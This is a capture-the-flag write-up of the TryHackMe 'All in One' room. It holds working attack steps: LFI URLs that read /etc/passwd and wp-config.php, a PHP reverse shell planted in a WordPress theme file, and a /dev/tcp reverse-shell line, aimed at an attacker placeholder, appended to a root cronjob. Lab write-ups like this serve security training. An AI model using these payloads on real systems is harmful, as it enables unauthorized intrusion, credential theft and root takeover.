---
title: "All in One"
platform: "TryHackMe"
difficulty: "Easy"
date: "2026-04-02"
tags: ["linux", "wordpress", "lfi", "cronjob"]
excerpt: "This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access."
icon: "https://tryhackme-images.s3.amazonaws.com/room-icons/915c0170a4d0a50cac23bac0f0b1f739.png"
roomUrl: "https://tryhackme.com/room/allinonemj"
---

## Initial Access
Every successful attack starts with **enumeration**.
The goal is simple: identify exposed services and understand the attack surface before doing anything noisy.

However, before jumping into scanning, it’s good practice to ensure the target is accessed correctly.

---

## Host Configuration
Edit your hosts file using an editor of your choice:  
```bash
sudo vi /etc/hosts
```

Add the target mapping at the end of the file (make sure to use a tab between the target IP and the hostname):  
```bash
<TARGET_IP>    all-in-one.thm
```

### Why this matters
Using a hostname instead of a raw IP is more than just convenience:  
- Some web applications rely on virtual host routing (vhosts)  
- Certain functionality may only be exposed when accessed via the correct domain  
- It ensures we are interacting with the application exactly as intended  

👉 From this point forward, I’ll use `all-in-one.thm` instead of the IP address.

---

## Service Enumeration
``` bash
nmap -sV -sC -p- -T4 -Pn <TARGET_IP>
```

![Nmap Screenshot](/assets/writeups/thm-rooms/allinonemj/nmap.png)

### Why this matters
- `-sV` reveals versions → useful for exploit matching  
- `-sC` runs scripts → quick vulnerability hints  
- `-p-` ensures no ports are missed  
- `-T4` aggressive timing template → faster scanning, good for reliable networks  
- `-Pn` Treat host as online → useful when ICMP is blocked  

### Findings
- 21 → FTP (anonymous allowed)
- 22 → SSH
- 80 → HTTP

👉 Focus shifts to HTTP as the most attackable surface.

---

## FTP Enumeration
We try accessing the ftp server using this command:  
``` bash
ftp <TARGET_IP>
```

![FTP Screenshot](/assets/writeups/thm-rooms/allinonemj/ftp.png)

### Explanation
Anonymous FTP access sometimes leaks credentials or backups.
In this case:  
- No useful files found  
- No credentials exposed  

👉 Dead end - move on quickly.

---

## Web Enumeration
We open our browser and navigate to the target:  
``` http
http://<TARGET_IP>
```

![Website Screenshot](/assets/writeups/thm-rooms/allinonemj/web.png)

### Observation
- Default Apache page  
- No obvious functionality  

👉 This usually means hidden content exists.

---

## Directory Brute Forcing
``` bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![Gobuster Screenshot](/assets/writeups/thm-rooms/allinonemj/gobuster.png)

### Why this is important
Web apps often hide:  
- Admin panels  
- CMS installations  
- Backup directories  

### Result
- `/wordpress`

👉 This is a big finding.

---

## Exploring the Web Application
After discovering the `/wordpress` directory during enumeration, I navigated to it:  
```http
http://<TARGET_IP>/wordpress
```

![Wordpress Website Screenshot](/assets/writeups/thm-rooms/allinonemj/wp_web.png)

### Observations
- The site is running a WordPress instance  
- A blog post is visible  
- The author is clearly identified as `elyana`  

### Why this matters
- WordPress often exposes usernames via posts and metadata  
- This gives us a valid user without brute forcing  

---

## WordPress Enumeration
To perform a more targeted enumeration, I used WPScan with specific flags:  
``` bash
wpscan --url http://<TARGET_IP>/wordpress --enumerate u,ap
```

![WPScan Screenshot](/assets/writeups/thm-rooms/allinonemj/wpscan.png)

### Why this command
- `--enumerate u` → enumerate usernames  
- `--enumerate ap` → enumerate all plugins  
- Focuses only on useful attack surface instead of noisy scans  

### Findings
- Confirmed user: `elyana`  
- Installed plugins identified  
- Two plugins flagged as vulnerable  

One of the identified plugins, Mail Masta, has a known Local File Inclusion (LFI) vulnerability listed on https://www.exploit-db.com/exploits/40290/.

### Why this matters
- Username → brute force or reuse  
- Plugins → common entry points  

The Mail Masta vulnerability is especially useful since LFI can allow reading sensitive files (e.g., `wp-config.php`), making it a strong initial access vector.

👉 Next: exploiting the Mail Masta plugin

---

## LFI Vulnerability (Mail Masta)
The **mail-masta plugin** is vulnerable to **Local File Inclusion(LFI)**.

### Test LFI
``` http
http://<TARGET_IP>/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

![LFI passwd Screenshot](/assets/writeups/thm-rooms/allinonemj/lfi_passwd.png)

### Explanation
- `/etc/passwd` confirms file read access  
- LFI allows reading internal files  

👉 Now target sensitive files.

---

## Extracting Credentials
``` http
http://<TARGET_IP>/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

![LFI wp-config Screenshot](/assets/writeups/thm-rooms/allinonemj/wpconfig.png)

### Why use php://filter
- Prevents parsing issues  
- Returns safe encoded output  

After decoding:  
👉 Credentials for `elyana` recovered

---

## WordPress Login
``` http
http://<TARGET_IP>/wordpress/wp-login.php
```

![WP Login Screenshot](/assets/writeups/thm-rooms/allinonemj/login1.png)
![WP Login Screenshot](/assets/writeups/thm-rooms/allinonemj/login2.png)

### Explanation
- WordPress login gives backend access  
- Backend = file editing → code execution  

👉 This is essentially RCE.

---

## Remote Code Execution
While attempting to edit `404.php`, WordPress returned the following error:  
> *“Unable to communicate back with site to check for fatal errors…”*

This occurs because WordPress performs a loopback request to validate PHP changes. Using the hostname (`all-in-one.thm`) caused this check to fail.

To resolve this, I accessed the application using its IP address instead, which allowed the file update to succeed.

Injected a **PHP reverse shell** (PentestMonkey):  
``` bash
  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = <ATTACKER_IP>;
  $port = 4444;
  ...
  ?>
```

![PHP Shell Screenshot](/assets/writeups/thm-rooms/allinonemj/php_shell.png)

### Why `404.php`
- Default theme file → always present  
- Triggered by requesting a non-existent page  
- Low risk of breaking the application  

### Why this worked
- WordPress requires a successful loopback request to save file edits  
- Using the IP instead of the hostname resolved the connectivity issue  

### Why a reverse shell
- Provides a fully interactive shell  
- More stable than command-based execution  
- Eliminates need to send commands via URL  

👉 Code execution achieved via theme file editing
👉 Direct path to system - level access

---

## Reverse Shell
Start listener:
``` bash
nc -lvnp 4444
```

Trigger the 404 page:
``` bash
curl http://<TARGET_IP>/wordpress/wp-content/themes/twentytwenty/404.php
```

![Reverse Shell Screenshot](/assets/writeups/thm-rooms/allinonemj/reverse_shell.png)

👉 Shell obtained.

---

## Stabilizing Shell
After gaining a shell, we'll try to stabilize it using the following commands:  
``` bash
# On victim machine
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background the shell
Ctrl+Z

# On attacker machine
stty raw -echo ; fg

# Then press Enter twice
export TERM=xterm
```

### Why this matters
- Fixes broken terminal behavior (no tab, arrows, etc.)  
- Enables proper command execution and interaction  

---

## Internal Enumeration
After obtaining a shell, I began enumerating the system for useful files and potential privilege escalation paths.

Navigated to the user directory, and found the elyana user:
``` bash
cd /home/elyana
ls
```

![Directory Screenshot](/assets/writeups/thm-rooms/allinonemj/elyana_hint.png)

### Discovery
Found two files:
- `user.txt`  
- `hint.txt`  

Attempting to read `user.txt` failed due to insufficient permissions, so I checked the hint instead:  
``` bash
cat hint.txt
```

The hint revealed:
> Elyana's user password is hidden in the system. Find it ;)

---

## Finding User Credentials
To locate files owned by `elyana`, I ran:  
``` bash
find / -type f -user elyana 2>/dev/null
```

![elyana User Credentials Screenshot](/assets/writeups/thm-rooms/allinonemj/elyana_user_creds.png)

### Why this works
- Searches the entire filesystem for files owned by a specific user  
- Helps uncover hidden or misconfigured sensitive files  

### Result
- Found: `/etc/mysql/conf.d/private.txt`

Reading the file:  
``` bash
cat /etc/mysql/conf.d/private.txt
```

- Revealed the password for user `elyana`

---

## User Access
Switched to the `elyana` user:  
``` bash
su elyana
```

After successful authentication:  
- Gained access to `user.txt`

``` bash
cat /home/elyana/user.txt
```

![User Flag Screenshot](/assets/writeups/thm-rooms/allinonemj/user_flag.png)

👉 User flag obtained

---

## Privilege Escalation (LinPEAS)
With user-level access, I proceeded to enumerate for privilege escalation vectors using LinPEAS:  
``` bash
./linpeas.sh
```

![LinPEAS Screenshot](/assets/writeups/thm-rooms/allinonemj/linpeas.png)

### Key Finding
- A cronjob running as root  
- The executed script was writable  

---

## Misconfiguration
This is critical because:  
- Cronjobs execute automatically  
- This one runs with root privileges  
- The script being executed is under user control  

👉 Any command added will run as root

---

## Exploiting Cronjob
I injected a reverse shell into the writable script:  
``` bash
echo "bash -c 'exec bash -i &>/dev/tcp/<ATTACKER_IP>/1337 <&1'" >> /var/backups/script.sh
```

![Cronjob Exploit Screenshot](/assets/writeups/thm-rooms/allinonemj/cronjob_exploit.png)

### Why this works
- Cron executes the script periodically  
- Payload runs as root  
- Establishes a reverse shell back to the attacker  

---

## Root Access
I started a listener:  
``` bash
nc -lvnp 1337
```

Waited for the cronjob to execute.

![Root Access Exploit Screenshot](/assets/writeups/thm-rooms/allinonemj/root_access.png)

👉 Root shell obtained

### Retrieving Root Flag
After gaining root access, I read the `root.txt` file from the `root` directory:  
```bash
cat /root/root.txt
```

![Root Flag Exploit Screenshot](/assets/writeups/thm-rooms/allinonemj/root_flag.png)

👉 Root flag successfully captured

<img src="https://media1.tenor.com/m/YbmQHDSJvbkAAAAd/thumbs-up-hacker.gif" width="400" className="mx-auto rounded-lg shadow-lg my-6">

---

## Conclusion
### Key Lessons
- Always enumerate user directories after initial access
- System-wide searches can reveal hidden credentials
- Misconfigured file permissions often lead to escalation
- Writable cronjobs are critical vulnerabilities

---

## Attack Chain
LFI → Credentials → WordPress Access → RCE → User Pivot → Cronjob Abuse → Root
